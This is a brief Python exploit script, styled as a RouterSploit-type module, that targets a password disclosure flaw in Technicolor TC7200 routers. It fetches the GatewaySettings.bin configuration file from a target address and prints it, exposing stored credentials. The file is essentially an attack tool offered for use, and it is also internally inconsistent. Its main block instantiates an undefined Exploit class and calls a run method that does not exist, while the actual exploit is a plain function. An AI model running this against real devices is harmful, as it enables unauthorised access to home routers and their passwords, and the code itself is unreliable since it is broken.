target = ""
# rsf exploit module
# description: Exploits Technicolor TC7200 password disclosure vulnerability.

import requests

def exploit(target, port):
    url = f"http://{target}:{port}/goform/system/GatewaySettings.bin"
    response = requests.get(url)
    if response.status_code == 200 and "0MLog" in response.text:
        print("[+] Exploit success - Dumping response:")
        print(response.text)
    else:
        print("[-] Target not vulnerable or request failed.")




import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
